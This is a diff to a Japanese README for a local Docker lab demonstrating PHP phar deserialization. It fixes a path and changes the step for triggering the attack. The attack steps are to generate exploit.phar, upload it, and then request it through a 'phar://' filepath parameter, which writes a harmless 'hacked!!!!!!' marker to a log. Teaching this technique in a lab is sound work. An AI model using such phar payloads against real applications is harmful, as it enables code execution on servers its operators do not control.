@@ -23,13 +23,13 @@ docker exec -it コンテナ名 bash
 
 # 攻撃手順
 ## Pharを生成
-コンテナの中で`php Phar/generate.php` を実行すると`exploit.phar`というファイルが生成される。
+コンテナの中で`php phar/generate.php` を実行すると`exploit.phar`というファイルが生成される。
 
 ## Pharをアップロードする
 `http://localhost:8000/`からファイルをuploadする
 
 ## アップロードしたPharを参照する
 
-`curl http://localhost:8000/fileget.php?filepath=phar://uploads/exploit.phar/hoge.txt`
+`http://localhost:8000/file_get_contents.php?filepath=phar://uploads/exploit.phar/hoge.txt`にアクセス
 
 すると、`Logs/sample.log`に`hacked!!!!!!`という文字列が書き込まれている。
